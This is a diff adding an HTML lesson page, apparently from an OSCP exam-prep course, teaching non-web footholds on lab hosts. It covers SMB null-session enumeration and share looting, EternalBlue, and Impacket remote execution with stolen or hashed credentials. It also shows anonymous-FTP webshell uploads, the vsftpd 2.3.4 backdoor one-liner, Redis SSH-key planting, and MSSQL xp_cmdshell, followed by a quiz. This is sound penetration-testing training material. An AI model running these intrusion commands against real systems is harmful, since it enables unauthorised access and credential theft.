@@ -1,0 +1,233 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Lesson 09 · Footholds Beyond the Web</title>
+<link rel="stylesheet" href="../assets/lesson.css">
+</head>
+<body>
+
+<nav class="crumbs">OSCP Course · <a href="../reference/links.html">Links</a> · <a href="./0008-password-attacks-and-credential-reuse.html">Lesson 08</a> · <strong>Lesson 09</strong> · <a href="../reference/enumeration-cheatsheet.html">Enum cheatsheet</a> · <a href="../reference/glossary.html">Glossary</a></nav>
+
+<span class="kicker">Lesson 09 · Footholds</span>
+<h1>Footholds Beyond the Web</h1>
+<p class="meta">Mission: pass the OSCP+ exam · Your win today: get a shell on a box with no web app — via SMB, FTP, or a known-vulnerable service version.</p>
+
+<p class="lead">Lessons 04 and 05 made HTTP feel like the way in. It's the <em>richest</em> door — but far from the only one. A large share of OSCP boxes hand you a foothold with no web app in sight: an open SMB share that leaks a config, an anonymous FTP server, or a service whose version string has a public exploit waiting for you. This is also the lesson where the engineer's instinct — "I have an exact version, is there a CVE?" — becomes operational. You'll turn a banner into a working shell.</p>
+
+<div class="box note">
+<span class="box-title">Where this sits</span>
+You've enumerated the box (Lesson 03) and you have a list of open ports and service versions. Most of those services are <em>not</em> web. This lesson is the playbook for the non-80/443 ports — and every foothold here is worth the same <strong>10 points</strong> as a web one.
+</div>
+
+<h2>The order of operations (try cheap first)</h2>
+<p>OSCP rewards low-hanging fruit. Before you write a single line of exploit code, walk this ladder top to bottom on every non-web service — most boxes fall on the first or second rung:</p>
+<ol class="steps">
+<li><strong>Anonymous / null access</strong> — can you read or list anything with no credentials at all? (smbclient -N, anonymous FTP, public SNMP, exported NFS.)</li>
+<li><strong>Known-vulnerable version</strong> — does the exact version map to a public exploit? (searchsploit the banner.)</li>
+<li><strong>Default / reused credentials</strong> — does <code>admin:admin</code>, <code>sa:</code> (blank), or a password you already looted from Lesson 08 work?</li>
+<li><strong>Custom exploitation</strong> — only when the easy rungs fail do you craft something bespoke.</li>
+</ol>
+<p>Each rung up is more effort and more risk. Discipline here is what separates a clean exam from a clock that runs out.</p>
+
+<h2>SMB (139/445) — the OSCP workhorse</h2>
+<p><strong>SMB</strong> is Windows file/printer sharing (and Samba on Linux). It is the single most productive non-web port on the exam, because misconfigured shares leak <em>exactly</em> the things you want: configs, backup scripts, password files, SSH keys.</p>
+
+<h3>Step 1 — enumerate without credentials</h3>
+<p>A <em>null session</em> (empty username + empty password) or a <em>guest</em> account often lets you list shares even on a locked-down box. Hit it four ways — tools disagree, so cross-check:</p>
+<pre><span class="p">$</span> <span class="o">smbclient -L //10.10.10.5/ -N</span>          <span class="c"># -N = no password (null session)</span>
+<span class="p">$</span> <span class="o">smbmap -H 10.10.10.5</span>                     <span class="c"># shows READ/WRITE per share — the key column</span>
+<span class="p">$</span> <span class="o">enum4linux-ng -A 10.10.10.5</span>              <span class="c"># users, groups, shares, OS, domain</span>
+<span class="p">$</span> <span class="o">nxc smb 10.10.10.5 -u '' -p '' --shares</span>   <span class="c"># netexec; try -u 'guest' too</span></pre>
+<p><code>nxc</code> (netexec, the maintained fork of CrackMapExec) also prints the OS and SMB version in its first line — note it, you'll need it for MS17-010.</p>
+
+<h3>Step 2 — loot READABLE shares</h3>
+<p>A share you can read is a filesystem you can grep. Connect and pull <em>everything</em> — read it offline, not over a laggy session:</p>
+<pre><span class="p">$</span> <span class="o">smbclient //10.10.10.5/backups -N</span>
+<span class="o">smb: \&gt; recurse ON</span>
+<span class="o">smb: \&gt; prompt OFF</span>
+<span class="o">smb: \&gt; mget *</span>                              <span class="c"># grab the whole share</span></pre>
+<p>Then <code>grep -ri "password\|pwd\|connectionstring\|secret"</code> the loot. Configs, <code>web.config</code>, PowerShell scripts, <code>.kdbx</code> vaults, and unattended-install XML are the usual gold.</p>
+
+<h3>Step 3 — abuse WRITABLE shares</h3>
+<p>If <code>smbmap</code> shows <strong>WRITE</strong>, you can do more than read. Two classic moves: drop a payload where it will be executed (e.g. a malicious file in a folder a scheduled task or user opens), or <em>poison</em> an existing file — replace a script the box runs, or plant a <code>.lnk</code>/SCF that coerces a victim to authenticate to you (capture the hash → Lesson 08). Don't overwrite blindly; copy the original first.</p>
+
+<h3>Step 4 — EternalBlue / MS17-010 (when the version matches)</h3>
+<p>Old, unpatched Windows running SMBv1 is vulnerable to <strong>MS17-010</strong> (EternalBlue) — a remote, pre-auth code-execution bug. The <em>tell</em>: an OS like Windows 7 / Server 2008 R2 in your version scan, SMBv1 enabled, and the nmap script lighting up:</p>
+<pre><span class="p">$</span> <span class="o">nmap -p445 --script smb-vuln-ms17-010 10.10.10.5</span>
+<span class="o">| smb-vuln-ms17-010:</span>
+<span class="o">|   VULNERABLE:</span>
+<span class="h">|   Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)</span></pre>
+<p>Confirmed, this is a clean SYSTEM shell — both the 10 foothold and 10 privesc points in one shot. Use a standalone PoC (e.g. the <code>AutoBlue-MS17-010</code> scripts) rather than the framework, so you stay within the exam's one-machine automation rule.</p>
+
+<h3>Step 5 — once you have creds, execute remotely</h3>
+<p>The moment you have a valid Windows credential (from a share, Lesson 08, or anywhere), SMB becomes a remote shell. The <strong>Impacket</strong> suite and netexec turn a username/password — or an NTLM hash (pass-the-hash) — into command execution:</p>
+<pre><span class="p">$</span> <span class="o">nxc smb 10.10.10.5 -u jdoe -p 'Summer2023!' -x whoami</span>   <span class="c"># quick one-shot command</span>
+<span class="p">$</span> <span class="o">wmiexec.py 'DOMAIN/jdoe:Summer2023!@10.10.10.5'</span>          <span class="c"># semi-interactive, no service dropped</span>
+<span class="p">$</span> <span class="o">psexec.py 'DOMAIN/Administrator:Pass1@10.10.10.5'</span>        <span class="c"># SYSTEM shell; needs admin + writable share</span>
+<span class="p">$</span> <span class="o">smbexec.py 'DOMAIN/Administrator:Pass1@10.10.10.5'</span>        <span class="c"># like psexec, different mechanism</span></pre>
+<p>Rule of thumb: <code>wmiexec.py</code> is the quiet first pick (no service install). <code>psexec.py</code> gives you SYSTEM but needs local-admin rights and a writable admin share. Pass a hash instead of a password with <code>-hashes LM:NT</code> when that's all you looted.</p>
+
+<h2>FTP (21) — old, and often wide open</h2>
+<p>FTP is the easiest non-web foothold to <em>check</em>, because anonymous access is one command away:</p>
+<pre><span class="p">$</span> <span class="o">nmap -p21 --script ftp-anon 10.10.10.5</span>          <span class="c"># does anonymous login work?</span>
+<span class="p">$</span> <span class="o">ftp 10.10.10.5</span>
+<span class="o">Name: anonymous</span>                                  <span class="c"># password: anything / blank</span>
+<span class="o">ftp&gt; ls</span>
+<span class="p">$</span> <span class="o">wget -m --no-passive ftp://anonymous:anon@10.10.10.5/</span>   <span class="c"># mirror the whole tree</span></pre>
+<p>Three things to look for:</p>
+<ul>
+<li><strong>Download everything</strong> and grep it — same loot logic as SMB. Source code, backups, and creds live here.</li>
+<li><strong>Webroot overlap.</strong> If the FTP root maps to the web server's document root (you can tell by uploading a file and requesting it over HTTP), you have a write-to-webroot primitive: upload a webshell, browse to it, get a shell. This is the classic FTP+HTTP combo box.</li>
+<li><strong>Known-vulnerable daemons.</strong> Two appear constantly on practice boxes: <strong>vsftpd 2.3.4</strong> (a backdoored release — a <code>:)</code> in the username opens a root shell on port 6200) and <strong>ProFTPD 1.3.5</strong> (<code>mod_copy</code>'s <code>SITE CPFR/CPTO</code> copies arbitrary files, e.g. straight into the webroot).</li>
+</ul>
+<pre><span class="p">$</span> <span class="o">searchsploit vsftpd</span>
+<span class="o">vsftpd 2.3.4 - Backdoor Command Execution           unix/remote/49757.py</span>
+<span class="o">vsftpd 2.3.4 - Backdoor Command Execution (Metasploit)  unix/remote/17491.rb</span></pre>
+
+<h2>From version string to shell — the core skill</h2>
+<p>This is the engineer's instinct made into a procedure. If you've ever matched a CVE to a deployed version, you already think this way — here it ends in a shell instead of a ticket. Your version scan from Lesson 03 gives you an exact product + version; this workflow turns it into code execution:</p>
+<ol class="steps">
+<li><strong>Get the exact version.</strong> <code>nmap -sV</code> or a banner grab — "vsftpd 2.3.4", "ProFTPD 1.3.5", "Apache 2.4.49". Vague isn't enough; the exploit cares about the point release.</li>
+<li><strong>Search.</strong> <code>searchsploit "&lt;product&gt; &lt;version&gt;"</code> locally, then cross-check <a href="https://www.exploit-db.com/">Exploit-DB</a> and the CVE online. Mirror a candidate into your working dir with <code>searchsploit -m 49757</code>.</li>
+<li><strong>READ the PoC before you run it.</strong> Open it (<code>searchsploit -x 49757</code>). Understand what it does, what it sends, and what it expects back. Never run code you haven't read.</li>
+<li><strong>Set the variables.</strong> Edit <code>LHOST</code>/<code>RHOST</code>, the target port, any memory offset or target index, the callback URL. Most PoCs have three or four constants at the top that must match your environment.</li>
+<li><strong>Run it carefully and catch the shell.</strong> Start your listener first (<code>nc -lvnp 443</code>), then fire. If it half-works, re-read the code — usually an offset or an encoding, not luck.</li>
+</ol>
+
+<div class="box warn">
+<span class="box-title">Vet public exploit code before you run it</span>
+Exploit-DB PoCs are unvetted, sometimes destructive, occasionally <em>backdoored</em> (a "reverse shell" that actually phones home to the author). <strong>Read every line first.</strong> Prefer reviewed exploits, decode any obfuscated blob, and test off-exam where you can. And remember the exam rule: automated frameworks (Metasploit and friends) are limited to <em>one</em> machine — so be fluent at running a raw Python/C PoC by hand on the other boxes.
+</div>
+
+<h2>Other high-yield non-web services</h2>
+<p>You won't see all of these, but each is a known foothold pattern. First moves only — enough to know if a door is open:</p>
+<table>
+<thead><tr><th>Service</th><th>Port</th><th>First moves</th></tr></thead>
+<tbody>
+<tr><td><strong>SNMP</strong></td><td>161/udp</td><td><code>onesixtyone -c communities.txt 10.10.10.5</code> to find the community string, then <code>snmpwalk -v2c -c public 10.10.10.5</code> — leaks processes, configs, sometimes creds in command lines.</td></tr>
+<tr><td><strong>NFS</strong></td><td>2049</td><td><code>showmount -e 10.10.10.5</code> lists exports; <code>mount -t nfs 10.10.10.5:/share /mnt</code>. If <code>no_root_squash</code> is set, you can plant a root-owned SUID binary — a privesc tie-in for later.</td></tr>
+<tr><td><strong>Redis</strong></td><td>6379</td><td><code>redis-cli -h 10.10.10.5</code>; if unauthenticated, write an SSH key to <code>~/.ssh/authorized_keys</code> or a webshell into the webroot via <code>config set dir</code>.</td></tr>
+<tr><td><strong>rsync</strong></td><td>873</td><td><code>rsync rsync://10.10.10.5/</code> lists modules; pull anonymous ones — often a full filesystem backup.</td></tr>
+<tr><td><strong>MySQL / MSSQL</strong></td><td>3306 / 1433</td><td>Try default/blank creds (<code>sa</code> with no password is common). On MSSQL: <code>mssqlclient.py user:pass@10.10.10.5</code> → <code>enable_xp_cmdshell</code> for OS commands. On MySQL: UDF for code execution.</td></tr>
+</tbody>
+</table>
+
+<h2>Worked example — SMB null session to interactive shell</h2>
+<p>A box with 445 open and no web app. Walk the SMB ladder. Start with a null/guest session and look at the permissions column:</p>
+<pre><span class="p">$</span> <span class="o">nxc smb 10.10.10.5 -u '' -p '' --shares</span>
+<span class="o">SMB  10.10.10.5  445  FILESERVER  [*] Windows Server 2016 (name:FILESERVER) (domain:CORP)</span>
+<span class="o">SMB  10.10.10.5  445  FILESERVER  [+] CORP\: (Guest)</span>
+<span class="o">SMB  10.10.10.5  445  FILESERVER  Share      Permissions   Remark</span>
+<span class="o">SMB  10.10.10.5  445  FILESERVER  IPC$       READ          Remote IPC</span>
+<span class="o">SMB  10.10.10.5  445  FILESERVER  </span><span class="h">backups    READ</span><span class="o">          Nightly job output</span></pre>
+<p>A readable <code>backups</code> share. Connect and pull it:</p>
+<pre><span class="p">$</span> <span class="o">smbclient //10.10.10.5/backups -N</span>
+<span class="o">smb: \&gt; ls</span>
+<span class="o">  backup.ps1        A      612  ...</span>
+<span class="o">smb: \&gt; get backup.ps1</span>
+<span class="p">$</span> <span class="o">grep -i pass backup.ps1</span>
+<span class="h">$cred = "CORP\jdoe:Summer2023!"   # service account for the nightly copy</span></pre>
+<p>A credential in a script. <strong>Validate before you trust it</strong> — netexec confirms it's live and tells you the privilege level:</p>
+<pre><span class="p">$</span> <span class="o">nxc smb 10.10.10.5 -u jdoe -p 'Summer2023!'</span>
+<span class="o">SMB  10.10.10.5  445  FILESERVER  </span><span class="h">[+] CORP\jdoe:Summer2023!</span></pre>
+<p>The <code>[+]</code> means the creds are valid (a <code>(Pwn3d!)</code> tag would mean local admin). Now turn it into a shell with Impacket — <code>wmiexec.py</code> for a quiet semi-interactive session:</p>
+<pre><span class="p">$</span> <span class="o">wmiexec.py 'CORP/jdoe:Summer2023!@10.10.10.5'</span>
+<span class="o">[*] SMBv3.0 dialect used</span>
+<span class="p">C:\&gt;</span> <span class="o">whoami</span>
+<span class="h">corp\jdoe</span>
+<span class="p">C:\&gt;</span> <span class="o">type C:\Users\jdoe\Desktop\local.txt</span></pre>
+<p>That's the foothold — 10 points. From here it's Windows privilege escalation (Lesson 07) to finish the box.</p>
+
+<div class="box tip">
+<span class="box-title">Same box, the version route</span>
+If that same host had instead shown <code>vsftpd 2.3.4</code> on port 21, the foothold is a one-liner: <code>searchsploit -m 49757 &amp;&amp; python3 49757.py 10.10.10.5</code> drops you a root shell via the backdoor — no creds needed. Always check the cheaper door first.
+</div>
+
+<div class="box mantra">
+Anonymous before exploited.<br>
+A leaked password beats a clever payload.
+</div>
+
+<h2>Putting it together</h2>
+<p>Every non-web port gets the same ladder: <strong>anonymous/null access → known-vulnerable version → default credentials → custom exploitation</strong>. Easy points first. The fastest exam shells come from a share you could simply read, an FTP you could simply log into, or a version string that someone already wrote the exploit for. Custom work is the rung you take only when the box leaves you no cheaper option — and even then, you read the PoC before you run it.</p>
+
+<h2>Check yourself</h2>
+<p>Retrieve before you reason — feedback appears under each.</p>
+<div class="quiz" id="quiz"></div>
+
+<div class="primary">
+<span class="box-title">▶ Primary source — your per-service playbook</span>
+<a href="https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-smb/index.html">HackTricks — Pentesting SMB</a> is the page to open the moment you see 445. It has every null-session command, share-enumeration trick, and remote-execution path in one place; the sibling pages cover FTP, SNMP, NFS, Redis, and the rest. Pair it with the <a href="https://github.com/fortra/impacket">Impacket suite</a> for credentialed execution.<sup class="ref"><a href="#s1">1</a></sup>
+</div>
+
+<div class="box tip">
+<span class="box-title">Do this before Lesson 10</span>
+Own a <em>non-web</em> box end to end. Pick one from <a href="https://www.netsecfocus.com/oscp/2021/05/06/The_Journey_to_Try_Harder-TJnull-s-Preparation_Guide_for_PEN-200_PWK_OSCP_2.0.html">TJ Null's list</a> whose way in is SMB, FTP, or a vulnerable service — by hand, no framework. Record the exact foothold path in your notes: which port, which command opened the door, which file or version was the win.
+</div>
+
+<div class="box note">
+<span class="box-title">Practice these boxes</span>
+<strong>Non-web footholds:</strong> <strong>Blue</strong> &amp; <strong>Legacy</strong> (HTB · Windows · Easy) for SMB CVEs; <strong>Lame</strong> (HTB · Linux) for vsftpd / Samba. <a href="../reference/practice-boxes.html#pb-09">→ Full box map for this lesson</a>.
+</div>
+
+<div class="teacher">
+<span class="box-title">I'm your teacher — ask me anything</span>
+Paste me an <code>nmap -sV</code> output or an <code>nxc --shares</code> dump and we'll pick the door together. Next: <strong>Lesson 10 — Active Directory: Fundamentals &amp; Enumeration</strong> — where 445 and these same tools become the keys to a whole domain, and the 40-point AD set.
+</div>
+
+<h2>Sources</h2>
+<ol class="sources">
+<li id="s1"><a href="https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-smb/index.html">HackTricks — Pentesting SMB</a> (null sessions, share loot, remote exec) and its per-service siblings. <a href="https://www.exploit-db.com/">Exploit-DB</a> + the <code>searchsploit</code> workflow for version-to-PoC. <a href="https://github.com/fortra/impacket">Impacket</a> (psexec/wmiexec/smbexec). Local commands: <a href="../reference/enumeration-cheatsheet.html">Enumeration cheatsheet</a>.</li>
+</ol>
+
+<footer>
+<span><a href="./0008-password-attacks-and-credential-reuse.html">← Lesson 08: Password Attacks &amp; Credential Reuse</a></span>
+<span><a href="./0010-active-directory-enumeration.html">Next → Lesson 10: Active Directory — Fundamentals &amp; Enumeration</a></span>
+</footer>
+
+<script src="../assets/quiz.js"></script>
+<script>
+renderQuiz('quiz', [
+  {
+    prompt: "Port 445 is open and you have no credentials. What's your first move?",
+    options: ["List the shares with a null session (smbclient -L -N / nxc --shares)", "Launch the EternalBlue exploit straight away", "Brute-force the Administrator password", "Write a custom SMB fuzzer for the box"],
+    answer: 0,
+    explain: "A null or guest session frequently lists (and reads) shares with zero creds — always the cheapest first check before anything heavier."
+  },
+  {
+    prompt: "You find a password inside a readable SMB share. Best next step?",
+    options: ["Validate it with netexec, then get a shell via wmiexec.py", "Assume it works and start writing the report", "Discard it because shares can't hold real creds", "Spray it across every host on the internet first"],
+    answer: 0,
+    explain: "Confirm the credential is live (nxc shows [+] / Pwn3d!), then turn it into execution with Impacket — validate, then exploit."
+  },
+  {
+    prompt: "Before running a public PoC from Exploit-DB, you should:",
+    options: ["Read every line to understand and vet what it does", "Run it immediately to save exam time", "Trust it because it's on a public site", "Pipe it straight to bash without looking"],
+    answer: 0,
+    explain: "Public PoCs are unvetted and occasionally destructive or backdoored — reading the code first is non-negotiable."
+  },
+  {
+    prompt: "Which finding is the tell-tale sign of an MS17-010 (EternalBlue) target?",
+    options: ["Latest Windows 11 with SMBv1 disabled", "Anonymous FTP login is allowed on port 21", "Old Windows (7 / 2008) with SMBv1, confirmed by the nmap smb-vuln script", "A Redis instance answering on port 6379"],
+    answer: 2,
+    explain: "EternalBlue hits unpatched SMBv1 on older Windows; nmap --script smb-vuln-ms17-010 returning VULNERABLE confirms it."
+  },
+  {
+    prompt: "Anonymous FTP works, and its root directory is the web server's document root. What's the foothold?",
+    options: ["Reset the FTP daemon to clear its logs", "Download files and stop — FTP can't lead to code execution", "Upload a webshell, then request it over HTTP for a shell", "Brute-force the FTP password even though anonymous already works"],
+    answer: 2,
+    explain: "Write-to-webroot is a code-execution primitive: drop a webshell via FTP and trigger it through the web server."
+  },
+  {
+    prompt: "You have an exact service version AND a custom idea. Which do you try first?",
+    options: ["The vetted public exploit for that version", "A bespoke exploit you write from scratch", "Nothing — skip the service entirely", "A loud automated framework on every box"],
+    answer: 0,
+    explain: "Easy points first: a reviewed public exploit matched to the version is far faster and lower-risk than hand-crafting one."
+  }
+]);
+</script>
+
+</body>
+</html>
